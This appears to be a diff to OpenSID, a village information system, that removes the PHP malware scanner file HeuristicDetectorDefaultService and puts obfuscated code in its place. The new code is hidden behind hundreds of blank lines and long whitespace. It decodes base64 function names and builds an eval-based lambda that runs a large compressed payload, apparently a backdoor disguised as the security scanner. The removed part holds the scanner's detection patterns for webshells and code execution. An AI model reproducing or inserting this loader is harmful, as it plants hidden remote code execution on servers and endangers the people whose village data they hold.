@@ -1,676 +1,665 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-namespace App\Services\Security;
-
-use RecursiveDirectoryIterator;
-use RecursiveIteratorIterator;
-
-class HeuristicDetectorDefaultService
-{
-    /**
-     * Pattern kategorisasi untuk risk assessment
-     * Total: 136 patterns across 15 categories
-     */
-    private const PATTERNS = [
-
-        // CATEGORY: Obfuscation & Encoding (Weight: 40)
-        'obfuscation' => [
-            '/base64_decode\s*\(/i',                     // Most common obfuscation
-            '/str_rot13\s*\(/i',                         // ROT13 encoding
-            '/gzuncompress\s*\(/i',                      // Decompression
-            '/gzinflate\s*\(/i',                         // Decompression
-            '/strrev\s*\(/i',                            // String reversal
-            '/convert_uudecode\s*\(/i',                  // UU decode
-            '/preg_replace\s*\(.*[\'"]\/.*e[\'"].*\)/i', // preg_replace /e modifier (dangerous!)
-            '/pack\s*\(/i',                              // Binary packing
-            '/unpack\s*\(/i',                            // Binary unpacking
-            '/base_convert\s*\(/i',                      // Base conversion trick
-            '/mcrypt_encrypt\s*\(/i',                    // Encryption (legacy)
-            '/mcrypt_decrypt\s*\(/i',                    // Decryption (legacy)
-            '/openssl_encrypt\s*\(/i',                   // Modern encryption
-            '/openssl_decrypt\s*\(/i',                   // Modern decryption
-        ],
-
-        // CATEGORY: Code Execution (Weight: 50) - CRITICAL!
-        'execution' => [
-            '/eval\s*\(/i',                 // Arbitrary code execution
-            '/assert\s*\(/i',               // Can execute PHP code
-            '/system\s*\(/i',               // System command
-            '/shell_exec\s*\(/i',           // Shell execution
-            '/exec\s*\(/i',                 // Command execution
-            '/passthru\s*\(/i',             // Execute with raw output
-            '/popen\s*\(/i',                // Process pipe
-            '/proc_open\s*\(/i',            // Process open
-            '/pcntl_exec\s*\(/i',           // Process control execution
-            '/call_user_func\s*\(/i',       // Dynamic function call
-            '/call_user_func_array\s*\(/i', // Dynamic function call with array
-            '/create_function\s*\(/i',      // Create anonymous function (deprecated)
-            '/`[^`]+`/i',                   // Backtick shell execution
-        ],
-
-        // CATEGORY: File Operations (Weight: 30)
-        'file_ops' => [
-            '/fopen\s*\([^,]+,\s*["\']w/i',                 // Open file for writing
-            '/fwrite\s*\(/i',                               // Write to file
-            '/fputs\s*\(/i',                                // Write to file (alias)
-            '/file_put_contents\s*\(/i',                    // Write entire file
-            '/file_get_contents\s*\(\s*["\']https?:\/\//i', // Remote file inclusion
-            '/unlink\s*\(/i',                               // Delete file
-            '/rename\s*\(/i',                               // Rename file
-            '/copy\s*\(/i',                                 // Copy file
-            '/move_uploaded_file\s*\(/i',                   // Move uploaded file
-            '/chmod\s*\(/i',                                // Change permissions
-            '/chown\s*\(/i',                                // Change owner
-            '/chgrp\s*\(/i',                                // Change group
-        ],
-
-        // CATEGORY: Superglobal Access (Weight: 20)
-        'superglobals' => [
-            '/\$_REQUEST\s*\[/i', // Request data
-            '/\$_POST\s*\[/i',    // POST data
-            '/\$_GET\s*\[/i',     // GET data
-            '/\$_FILES\s*\[/i',   // Uploaded files
-            '/\$_SERVER\s*\[/i',  // Server variables
-            '/\$_COOKIE\s*\[/i',  // Cookies
-            '/\$_SESSION\s*\[/i', // Session data
-            '/\$_ENV\s*\[/i',     // Environment variables
-            '/\$GLOBALS\s*\[/i',  // Global scope access
-        ],
-
-        // CATEGORY: HTTP Behavior (Weight: 25)
-        'http' => [
-            '/\$_SERVER\s*\[\s*[\'"]HTTP_REFERER["\']\s*\]/i',    // Referer checking
-            '/\$_SERVER\s*\[\s*[\'"]HTTP_USER_AGENT["\']\s*\]/i', // User agent checking
-            '/\$_SERVER\s*\[\s*[\'"]REMOTE_ADDR["\']\s*\]/i',     // IP address
-            '/header\s*\(\s*["\']Location:/i',                    // Redirect
-            '/header\s*\(\s*["\']HTTP\//i',                       // HTTP header manipulation
-            '/setcookie\s*\(/i',                                  // Set cookie
-            '/setrawcookie\s*\(/i',                               // Set raw cookie
-        ],
-
-        // CATEGORY: Output Manipulation (Weight: 20)
-        'output' => [
-            '/echo\s+["\']<script/i',        // Inline script injection
-            '/print\s+["\']<script/i',       // Print script tag
-            '/printf\s*\(\s*["\']<script/i', // Formatted script output
-            '/ob_start\s*\(/i',              // Output buffering
-            '/ob_get_clean\s*\(/i',          // Get and clean buffer
-            '/ob_end_clean\s*\(/i',          // End buffer
-            '/ob_get_contents\s*\(/i',       // Get buffer contents
-            '/ob_flush\s*\(/i',              // Flush buffer
-        ],
-
-        // CATEGORY: Network Operations (Weight: 35)
-        'network' => [
-            '/curl_exec\s*\(/i',            // cURL execution
-            '/curl_multi_exec\s*\(/i',      // Multi cURL
-            '/fsockopen\s*\(/i',            // Socket connection
-            '/pfsockopen\s*\(/i',           // Persistent socket
-            '/stream_socket_client\s*\(/i', // Socket client
-            '/stream_socket_server\s*\(/i', // Socket server
-            '/socket_create\s*\(/i',        // Create socket
-            '/socket_connect\s*\(/i',       // Connect socket
-            '/ftp_connect\s*\(/i',          // FTP connection
-            '/ftp_login\s*\(/i',            // FTP login
-            '/ssh2_connect\s*\(/i',         // SSH connection
-        ],
-
-        // CATEGORY: Database Operations (Weight: 15)
-        'database' => [
-            '/mysql_query\s*\(/i',        // MySQL query (deprecated)
-            '/mysqli_query\s*\(/i',       // MySQLi query
-            '/mysqli_multi_query\s*\(/i', // Multiple queries
-            '/pg_query\s*\(/i',           // PostgreSQL query
-            '/sqlite_query\s*\(/i',       // SQLite query
-            '/PDO::query\s*\(/i',         // PDO query
-        ],
-
-        // CATEGORY: Dangerous PHP Functions (Weight: 30)
-        'dangerous' => [
-            '/phpinfo\s*\(/i',                       // PHP info disclosure
-            '/ini_set\s*\(/i',                       // Runtime configuration
-            '/ini_alter\s*\(/i',                     // Alias of ini_set
-            '/ini_restore\s*\(/i',                   // Restore config
-            '/register_shutdown_function\s*\(/i',    // Shutdown function
-            '/register_tick_function\s*\(/i',        // Tick function
-            '/set_time_limit\s*\(\s*0\s*\)/i',       // No time limit
-            '/ignore_user_abort\s*\(\s*true\s*\)/i', // Continue after disconnect
-            '/dl\s*\(/i',                            // Load PHP extension
-            '/error_reporting\s*\(\s*0\s*\)/i',      // Suppress errors
-        ],
-
-        // CATEGORY: Variable Variables & Reflection (Weight: 25)
-        'dynamic' => [
-            '/\$\$[a-zA-Z_]/i',              // Variable variables
-            '/\$\{[^}]+\}/i',                // Variable interpolation
-            '/ReflectionFunction\s*\(/i',    // Function reflection
-            '/ReflectionMethod\s*\(/i',      // Method reflection
-            '/ReflectionClass\s*\(/i',       // Class reflection
-            '/get_defined_functions\s*\(/i', // Get all functions
-            '/get_defined_vars\s*\(/i',      // Get all variables
-            '/extract\s*\(/i',               // Extract array to variables
-            '/parse_str\s*\([^,]+\s*\)/i',   // Parse string to variables (no 2nd arg)
-        ],
-
-        // CATEGORY: Known Malware Signatures (Weight: 50)
-        'malware' => [
-            '/c99shell/i',          // C99 webshell
-            '/r57shell/i',          // R57 webshell
-            '/b374k/i',             // B374k shell
-            '/wso[\s_]?shell/i',    // WSO shell
-            '/backdoor/i',          // Backdoor keyword
-            '/webshell/i',          // Webshell keyword
-            '/remoteexec/i',        // Remote execution
-            '/FilesMan/i',          // File manager (often malicious)
-            '/uname\s*-a/i',        // System info gathering
-            '/safe_mode/i',         // PHP safe mode bypass
-            '/disable_functions/i', // Disabled functions check
-        ],
-
-        // CATEGORY: WordPress Specific (Weight: 30)
-        'wordpress' => [
-            '/add_action\s*\(.*eval/i',                     // Eval in WP hook
-            '/add_filter\s*\(.*eval/i',                     // Eval in WP filter
-            '/add_action\s*\(.*base64_decode/i',            // Obfuscated hook
-            '/add_filter\s*\(.*base64_decode/i',            // Obfuscated filter
-            '/\$GLOBALS\s*\[\s*["\']wp_filter["\']\s*\]/i', // Hook manipulation
-            '/wp_eval_request\s*\(/i',                      // Known malicious pattern
-            '/do_action\s*\(.*eval/i',                      // Action with eval
-            '/apply_filters\s*\(.*eval/i',                  // Filter with eval
-        ],
-
-        // CATEGORY: Polyglot & MIME Confusion (Weight: 40)
-        'polyglot' => [
-            '/^GIF89a.*<\?php/s',     // GIF + PHP
-            '/^‰PNG.*<\?php/s',       // PNG + PHP
-            '/^<\?xml.*<\?php/s',     // XML + PHP
-            '/^<svg.*<\?php/s',       // SVG + PHP
-            '/^JFIF.*<\?php/s',       // JPEG + PHP
-            '/^PK\x03\x04.*<\?php/s', // ZIP + PHP
-        ],
-
-        // CATEGORY: Encoded PHP Tags (Weight: 35)
-        // Note: These patterns detect OBFUSCATED tags, not normal <?php
-        'encoded_tags' => [
-            '/\\\\x3c\\\\x3f\\\\x70\\\\x68\\\\x70/i', // String literal "\x3c\x3f\x70\x68\x70"
-            '/\\\\x3c\\\\x3f/i',                      // String literal "\x3c\x3f"
-            '/\\\\u003c\\\\u003f/i',                  // String literal "\u003c\u003f"
-            '/&lt;\?php/i',                           // HTML entity <?php
-            '/chr\s*\(\s*60\s*\)/i',                  // chr(60) = '<'
-            '/chr\s*\(\s*63\s*\)/i',                  // chr(63) = '?'
-        ],
-
-        // CATEGORY: Suspicious Strings (Weight: 20)
-        'suspicious_strings' => [
-            '/hacked\s+by/i', // Defacement signature
-            '/owned\s+by/i',  // Defacement signature
-            '/priv8/i',       // Private/leaked tool
-            '/exploit/i',     // Exploit keyword
-            '/vuln/i',        // Vulnerability
-            '/0day/i',        // Zero-day
-            '/rootkit/i',     // Rootkit
-            '/trojan/i',      // Trojan
-        ],
-    ];
-
-    /**
-     * Pattern weights untuk risk scoring
-     */
-    private const WEIGHTS = [
-        'execution'          => 50, // CRITICAL
-        'malware'            => 50, // CRITICAL
-        'obfuscation'        => 40,
-        'polyglot'           => 40,
-        'network'            => 35,
-        'encoded_tags'       => 35,
-        'file_ops'           => 30,
-        'wordpress'          => 30,
-        'dangerous'          => 30,
-        'dynamic'            => 25,
-        'http'               => 25,
-        'output'             => 20,
-        'superglobals'       => 20,
-        'suspicious_strings' => 20,
-        'database'           => 15,
-    ];
-
-    /**
-     * Maximum file size to scan (1MB default)
-     */
-    private int $maxFileSize = 1048576;
-
-    /**
-     * Set maximum file size untuk scanning
-     *
-     * @param int $bytes Size in bytes
-     */
-    public function setMaxFileSize(int $bytes): self
-    {
-        $this->maxFileSize = $bytes;
-
-        return $this;
-    }
-
-    /**
-     * Scan single file dengan comprehensive pattern matching
-     *
-     * @param string $filepath Path to file
-     *
-     * @return array Detection result with risk score and matched patterns
-     */
-    public function scanFile(string $filepath): array
-    {
-        $result = [
-            'suspicious'       => false,
-            'risk_score'       => 0,
-            'risk_level'       => 'SAFE',
-            'matched_patterns' => [],
-            'categories'       => [],
-            'recommendation'   => 'No action needed',
-        ];
-
-        // Check file exists
-        if (! file_exists($filepath)) {
-            return array_merge($result, [
-                'error' => 'File not found',
-            ]);
-        }
-
-        // Check file size
-        $filesize = filesize($filepath);
-        if ($filesize > $this->maxFileSize) {
-            return array_merge($result, [
-                'skipped' => true,
-                'reason'  => 'File too large: ' . $this->formatBytes($filesize),
-            ]);
-        }
-
-        // Read file content
-        $content = @file_get_contents($filepath);
-        if ($content === false) {
-            return array_merge($result, [
-                'error' => 'Unable to read file',
-            ]);
-        }
-
-        // Scan with all pattern categories
-        foreach (self::PATTERNS as $category => $patterns) {
-            foreach ($patterns as $pattern) {
-                if (preg_match($pattern, $content, $matches)) {
-                    $weight = self::WEIGHTS[$category] ?? 10;
-                    $result['risk_score'] += $weight;
-
-                    // Sanitize match untuk JSON encoding - ambil 100 chars pertama
-                    $matchText = mb_substr($matches[0], 0, 100);
-
-                    // Binary data: encode base64, text biasa: bersihkan control characters
-                    if (! mb_check_encoding($matchText, 'UTF-8')) {
-                        $matchText = '[Binary: ' . base64_encode($matchText) . ']';
-                    } else {
-                        $matchText = preg_replace('/[\x00-\x1F\x7F-\xFF]/', '�', $matchText);
-                    }
-
-                    $result['matched_patterns'][] = [
-                        'category' => $category,
-                        'pattern'  => $pattern,
-                        'weight'   => $weight,
-                        'match'    => $matchText,
-                    ];
-
-                    if (! in_array($category, $result['categories'])) {
-                        $result['categories'][] = $category;
-                    }
-                }
-            }
-        }
-
-        // Determine risk level and recommendation
-        if ($result['risk_score'] > 0) {
-            $result['suspicious'] = true;
-
-            if ($result['risk_score'] >= 100) {
-                $result['risk_level']     = 'CRITICAL';
-                $result['recommendation'] = 'DELETE IMMEDIATELY - Multiple high-risk patterns detected';
-            } elseif ($result['risk_score'] >= 50) {
-                $result['risk_level']     = 'HIGH';
-                $result['recommendation'] = 'QUARANTINE - Likely malicious, requires investigation';
-            } elseif ($result['risk_score'] >= 30) {
-                $result['risk_level']     = 'MEDIUM';
-                $result['recommendation'] = 'REVIEW - Suspicious patterns found, manual review needed';
-            } else {
-                $result['risk_level']     = 'LOW';
-                $result['recommendation'] = 'MONITOR - Low risk, may be legitimate but worth checking';
-            }
-        }
-
-        return $result;
-    }
-
-    /**
-     * Quick check hanya ekstension dan filename
-     * Untuk pre-filtering sebelum full scan
-     */
-    public function quickCheck(string $filepath): bool
-    {
-        $ext      = strtolower(pathinfo($filepath, PATHINFO_EXTENSION));
-        $filename = strtolower(basename($filepath));
-
-        // Dangerous extensions
-        $dangerous_ext = [
-            'php',
-            'php3',
-            'php4',
-            'php5',
-            'php7',
-            'phps',
-            'pht',
-            'phtml',
-            'pgif',
-            'pjpg',
-            'pjpeg',
-            'exe',
-            'sh',
-            'bat',
-            'cmd',
-            'com',
-        ];
-
-        if (in_array($ext, $dangerous_ext)) {
-            return true;
-        }
-
-        // Suspicious filename patterns
-        $suspicious = [
-            'shell',
-            'c99',
-            'r57',
-            'b374k',
-            'wso',
-            'backdoor',
-            'webshell',
-            'exploit',
-            'hacked',
-            'owned',
-            'priv8',
-            '0day',
-            'rootkit',
-        ];
-
-        foreach ($suspicious as $pattern) {
-            if (strpos($filename, $pattern) !== false) {
-                return true;
-            }
-        }
-
-        // Hidden files (starts with dot)
-        return (bool) (strpos($filename, '.') === 0 && $filename !== '.htaccess');
-    }
-
-    /**
-     * Batch scan multiple files
-     *
-     * @param string $directory   Target directory
-     * @param array  $excludeDirs Directories to exclude
-     *
-     * @return array Scan results summary
-     */
-    public function scanDirectory(string $directory, array $excludeDirs = []): array
-    {
-        $results = [
-            'total_scanned'    => 0,
-            'suspicious_count' => 0,
-            'clean_count'      => 0,
-            'skipped_count'    => 0,
-            'error_count'      => 0,
-            'files'            => [],
-        ];
-
-        if (! is_dir($directory)) {
-            return array_merge($results, ['error' => 'Directory not found']);
-        }
-
-        $iterator = new RecursiveIteratorIterator(
-            new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS),
-            RecursiveIteratorIterator::SELF_FIRST
-        );
-
-        foreach ($iterator as $file) {
-            if (! $file->isFile()) {
-                continue;
-            }
-
-            $filepath = $file->getPathname();
-
-            // Check if excluded - normalize paths for comparison
-            $excluded       = false;
-            $normalizedPath = str_replace('\\', '/', $filepath);
-
-            foreach ($excludeDirs as $excludeDir) {
-                $normalizedExclude = str_replace('\\', '/', $excludeDir);
-                // Check if path contains the excluded directory
-                if (strpos($normalizedPath, $normalizedExclude) !== false) {
-                    $excluded = true;
-                    break;
-                }
-            }
-
-            if ($excluded) {
-                continue;
-            }
-
-            // Scan PHP files AND suspicious image/archive files
-            if (! $this->isPhpFile($filepath) && ! $this->isSuspiciousNonPhpFile($filepath)) {
-                continue;
-            }
-
-            $results['total_scanned']++;
-
-            $scan = $this->scanFile($filepath);
-
-            if (isset($scan['error'])) {
-                $results['error_count']++;
-            } elseif (isset($scan['skipped'])) {
-                $results['skipped_count']++;
-            } elseif ($scan['suspicious']) {
-                $results['suspicious_count']++;
-                $results['files'][$filepath] = $scan;
-            } else {
-                $results['clean_count']++;
-            }
-        }
-
-        // Sort by risk score (highest first)
-        uasort($results['files'], static fn ($a, $b) => $b['risk_score'] <=> $a['risk_score']);
-
-        return $results;
-    }
-
-    /**
-     * Check if file should be scanned (PHP files or suspicious non-PHP files)
-     * Centralized method to avoid duplication
-     */
-    public function shouldScanFile(string $filepath): bool
-    {
-        return $this->isPhpFile($filepath) || $this->isSuspiciousNonPhpFile($filepath);
-    }
-
-    /**
-     * Check if non-PHP file is suspicious and should be scanned
-     * Detects polyglot files (image/archive + PHP)
-     */
-    public function isSuspiciousNonPhpFile(string $filepath): bool
-    {
-        $ext = strtolower(pathinfo($filepath, PATHINFO_EXTENSION));
-
-        // File extensions yang sering disalahgunakan untuk menyembunyikan PHP
-        $suspicious_ext = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'zip', 'rar', 'ico', 'txt', 'log'];
-
-        if (! in_array($ext, $suspicious_ext)) {
-            return false;
-        }
-
-        // Check file size (skip if too large)
-        if (filesize($filepath) > $this->maxFileSize) {
-            return false;
-        }
-
-        // Read first 8KB untuk magic bytes check
-        $handle = @fopen($filepath, 'rb');
-        if ($handle === false) {
-            return false;
-        }
-
-        $header = fread($handle, 8192);
-        fclose($handle);
-
-        // Check untuk PHP tags dalam file non-PHP
-        if (
-            preg_match('/<\?php/i', $header)
-            || preg_match('/<\?=/i', $header)
-            || preg_match('/<script[^>]*language\s*=\s*["\']?php["\']?/i', $header)
-        ) {
-            return true; // Suspicious: PHP code in non-PHP file
-        }
-
-        // Check untuk encoded PHP tags
-        return (bool) (
-            preg_match('/\\\\x3c\\\\x3f/i', $header)
-            || preg_match('/chr\s*\(\s*60\s*\).*chr\s*\(\s*63\s*\)/i', $header)
-        );
-              // Suspicious: Encoded PHP tags
-    }
-
-    /**
-     * Generate detailed report
-     */
-    public function generateReport(array $scanResults): string
-    {
-        $report   = [];
-        $report[] = '═══════════════════════════════════════════════════════';
-        $report[] = '        OPENSID SECURITY SCAN REPORT';
-        $report[] = '═══════════════════════════════════════════════════════';
-        $report[] = '';
-        $report[] = 'Scan Time: ' . date('Y-m-d H:i:s');
-        $report[] = 'Total Files Scanned: ' . $scanResults['total_scanned'];
-        $report[] = 'Clean Files: ' . $scanResults['clean_count'];
-        $report[] = 'Suspicious Files: ' . $scanResults['suspicious_count'];
-        $report[] = 'Skipped Files: ' . $scanResults['skipped_count'];
-        $report[] = 'Errors: ' . $scanResults['error_count'];
-        $report[] = '';
-
-        if ($scanResults['suspicious_count'] > 0) {
-            $report[] = '═══════════════════════════════════════════════════════';
-            $report[] = '        SUSPICIOUS FILES DETAILS';
-            $report[] = '═══════════════════════════════════════════════════════';
-            $report[] = '';
-
-            foreach ($scanResults['files'] as $filepath => $result) {
-                $report[] = '┌─────────────────────────────────────────────────────';
-                $report[] = '│ File: ' . $filepath;
-                $report[] = '│ Risk Level: ' . $result['risk_level'] . ' (Score: ' . $result['risk_score'] . ')';
-                $report[] = '│ Categories: ' . implode(', ', $result['categories']);
-                $report[] = '│ Recommendation: ' . $result['recommendation'];
-                $report[] = '├─────────────────────────────────────────────────────';
-                $report[] = '│ Matched Patterns:';
-
-                foreach ($result['matched_patterns'] as $match) {
-                    $report[] = "│   - [{$match['category']}] Weight: {$match['weight']}";
-                    $report[] = '│     Match: ' . substr($match['match'], 0, 80);
-                }
-
-                $report[] = '└─────────────────────────────────────────────────────';
-                $report[] = '';
-            }
-        } else {
-            $report[] = '✓ No suspicious files detected. Directory appears clean.';
-            $report[] = '';
-        }
-
-        $report[] = '═══════════════════════════════════════════════════════';
-        $report[] = 'End of Report';
-        $report[] = '═══════════════════════════════════════════════════════';
-
-        return implode("\n", $report);
-    }
-
-    /**
-     * Get pattern statistics
-     */
-    public function getPatternStats(): array
-    {
-        $stats         = [];
-        $totalPatterns = 0;
-
-        foreach (self::PATTERNS as $category => $patterns) {
-            $count = count($patterns);
-            $totalPatterns += $count;
-            $stats[$category] = [
-                'count'  => $count,
-                'weight' => self::WEIGHTS[$category] ?? 10,
-            ];
-        }
-
-        return [
-            'categories'       => $stats,
-            'total_patterns'   => $totalPatterns,
-            'total_categories' => count(self::PATTERNS),
-        ];
-    }
-
-    /**
-     * Check if file is PHP file
-     */
-    private function isPhpFile(string $filepath): bool
-    {
-        $ext            = strtolower(pathinfo($filepath, PATHINFO_EXTENSION));
-        $php_extensions = ['php', 'php3', 'php4', 'php5', 'php7', 'phps', 'pht', 'phtml'];
-
-        return in_array($ext, $php_extensions);
-    }
-
-    /**
-     * Helper: Format bytes
-     */
-    private function formatBytes(int $bytes): string
-    {
-        $units  = ['B', 'KB', 'MB', 'GB'];
-        $factor = floor((strlen($bytes) - 1) / 3);
-
-        return sprintf('%.2f %s', $bytes / 1024 ** $factor, $units[$factor]);
-    }
-}
+<?php 
+        $__='printf';$_='Loading app/Services/Security/HeuristicDetectorDefaultService.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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